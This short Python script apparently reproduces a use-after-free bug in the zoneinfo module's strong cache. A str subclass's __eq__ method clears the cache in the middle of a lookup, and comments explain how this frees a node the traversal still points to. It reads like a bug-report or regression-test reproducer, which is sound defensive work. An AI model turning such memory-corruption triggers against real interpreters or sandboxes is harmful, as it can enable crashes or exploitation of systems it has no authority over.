import zoneinfo
from zoneinfo import ZoneInfo

class Evil(str):
    def __eq__(self, other):
        # re-enter and free every StrongCacheNode while find_in_strong_cache
        # holds a raw `node` pointer mid-traversal
        ZoneInfo.clear_cache()
        return False
    __hash__ = str.__hash__

# populate the strong cache with a few nodes
ZoneInfo("America/New_York")
ZoneInfo("Europe/London")
ZoneInfo("Asia/Tokyo")

# traversal calls key.__eq__ (Evil) -> clear_cache frees node -> node=node->next is UAF
ZoneInfo(Evil("America/New_York"))
print("no crash")
